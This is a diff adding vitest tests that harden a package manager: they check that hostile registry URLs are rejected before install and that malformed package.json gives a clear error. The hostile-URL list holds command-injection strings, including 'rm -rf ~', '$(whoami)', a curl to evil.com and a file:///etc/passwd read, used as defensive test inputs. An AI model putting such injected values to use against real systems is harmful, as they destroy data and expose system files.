@@ -1,0 +1,96 @@
+/**
+ * Hardening tests for the package manager:
+ *  - B40: the custom registry URL is passed to the package manager (now via execFileSync argv,
+ *    no shell), so a malformed / hostile value must be rejected before the install runs.
+ *  - B39: a malformed package.json yields a clear, path-qualified error (not an opaque
+ *    "Unexpected token in JSON").
+ */
+import { describe, it, expect, vi, beforeEach } from 'vitest';
+
+vi.mock('node:fs', () => ({
+    readFileSync: vi.fn(),
+    writeFileSync: vi.fn(),
+    existsSync: vi.fn(),
+    readdirSync: vi.fn(() => []),
+}));
+vi.mock('node:child_process', () => ({
+    execFileSync: vi.fn(() => ''),
+}));
+
+import { readFileSync, existsSync } from 'node:fs';
+import { execFileSync } from 'node:child_process';
+import { RunPackageInstall, AddAppPackages, type PackageManagerOptions } from '../install/package-manager.js';
+
+const mockReadFileSync = vi.mocked(readFileSync);
+const mockExistsSync = vi.mocked(existsSync);
+const mockExecFileSync = vi.mocked(execFileSync);
+
+beforeEach(() => {
+    vi.clearAllMocks();
+    // No lock files → npm is the detected package manager.
+    mockExistsSync.mockReturnValue(false);
+});
+
+describe('RunPackageInstall — registry URL validation (B40)', () => {
+    const hostile = [
+        'https://evil.com; rm -rf ~',
+        'https://evil.com/$(whoami)',
+        'https://evil.com/`id`',
+        'https://reg.com && curl evil',
+        'file:///etc/passwd',
+        'not-a-url',
+    ];
+
+    for (const url of hostile) {
+        it(`rejects a hostile/invalid registry URL without shelling out: ${url}`, () => {
+            const result = RunPackageInstall('/fake/root', false, url);
+            expect(result.Success).toBe(false);
+            expect(result.ErrorMessage).toContain('Invalid custom registry URL');
+            expect(mockExecFileSync).not.toHaveBeenCalled();
+        });
+    }
+
+    it('allows a clean custom registry and passes it as a literal --registry argv element', () => {
+        const result = RunPackageInstall('/fake/root', false, 'https://registry.acme.com/');
+        expect(result.Success).toBe(true);
+        expect(mockExecFileSync).toHaveBeenCalledTimes(1);
+        // execFileSync(bin, argv, opts) — the registry flag is a single argv element, never a
+        // shell-parsed substring of a command string.
+        const argv = mockExecFileSync.mock.calls[0][1] as string[];
+        expect(argv).toContain('--registry=https://registry.acme.com/');
+    });
+
+    it('does not pass --registry for the default npm registry', () => {
+        const result = RunPackageInstall('/fake/root', false, 'https://registry.npmjs.org/');
+        expect(result.Success).toBe(true);
+        expect(mockExecFileSync).toHaveBeenCalledTimes(1);
+        const argv = mockExecFileSync.mock.calls[0][1] as string[];
+        expect(argv.some(a => a.startsWith('--registry'))).toBe(false);
+    });
+});
+
+describe('AddAppPackages — malformed package.json (B39)', () => {
+    function opts(): PackageManagerOptions {
+        return {
+            RepoRoot: '/fake/root',
+            ServerPackages: [{ name: '@acme/server', role: 'bootstrap', startupExport: 'LoadAcme' }],
+            ClientPackages: [],
+            SharedPackages: [],
+            Version: '1.0.0',
+            ServerPackagePath: 'apps/Server',
+            ClientPackagePath: 'apps/Client',
+        };
+    }
+
+    it('returns a clear, path-qualified error instead of an opaque JSON SyntaxError', () => {
+        mockExistsSync.mockReturnValue(true); // package.json "exists"
+        mockReadFileSync.mockReturnValue('{ this is not valid json ');
+
+        const result = AddAppPackages(opts());
+
+        expect(result.Success).toBe(false);
+        // Pre-fix: a bare "Unexpected token..." with no file context.
+        expect(result.ErrorMessage).toContain('Invalid JSON in');
+        expect(result.ErrorMessage).toContain('package.json');
+    });
+});
